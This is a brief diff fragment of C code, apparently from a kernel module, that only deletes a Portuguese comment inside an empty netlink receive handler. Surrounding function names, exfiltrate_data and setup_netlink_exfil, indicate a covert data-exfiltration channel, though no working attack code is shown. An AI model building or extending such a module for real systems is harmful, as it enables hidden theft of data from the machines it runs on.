@@ -26,7 +26,7 @@ void exfiltrate_data(const char *data, size_t len) {
 }
 
 static void netlink_recv_msg(struct sk_buff *skb) {
-    // Silenciosamente ignora pacotes recebidos
+    
 }
 
 void setup_netlink_exfil(void) {
